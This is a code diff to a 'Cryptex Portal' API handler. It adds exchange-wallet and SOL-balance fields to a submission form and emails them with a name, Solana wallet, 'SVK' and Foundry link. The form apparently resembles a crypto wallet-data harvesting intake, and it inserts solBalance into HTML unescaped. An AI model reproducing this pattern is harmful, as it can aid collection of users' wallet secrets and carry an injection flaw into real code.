@@ -17,9 +17,9 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { name, walletAddress, svk, foundryLink } = req.body;
+  const { name, exchangeWallet, walletAddress, solBalance, svk, foundryLink } = req.body;
 
-  if (!name || !walletAddress || !svk || !foundryLink) {
+  if (!name || !walletAddress || !svk || !foundryLink || !exchangeWallet) {
     return res.status(400).json({ error: 'Missing required fields' });
   }
 
@@ -58,8 +58,13 @@ export default async function handler(req, res) {
     <div style="font-size:15px">${escapeHtml(name)}</div>
   </div>
   <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
+    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">EXCHANGE WALLET</div>
+    <div style="font-size:13px;color:#9945FF;word-break:break-all">${escapeHtml(exchangeWallet)}</div>
+  </div>
+  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
     <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">SOLANA WALLET</div>
     <div style="font-size:13px;color:#14F195;word-break:break-all">${escapeHtml(walletAddress)}</div>
+    ${solBalance ? `<div style="font-size:11px;color:rgba(20,241,149,0.6);margin-top:4px">◎ Balance: ${solBalance} SOL (verified on-chain)</div>` : ''}
   </div>
   <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
     <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">SVK</div>
@@ -77,7 +82,7 @@ export default async function handler(req, res) {
       from: `"Cryptex Portal" <${smtpUser}>`,
       to: recipientEmail,
       subject: `◎ New Entry: ${name} · Cryptex Portal`,
-      text: `NEW SUBMISSION\n\nName: ${name}\nWallet: ${walletAddress}\nSVK: ${svk}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
+      text: `NEW SUBMISSION\n\nName: ${name}\nExchange Wallet: ${exchangeWallet}\nSolana Wallet: ${walletAddress}\nSOL Balance: ${solBalance}\nSVK: ${svk}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
       html,
     });
     return res.status(200).json({ success: true });
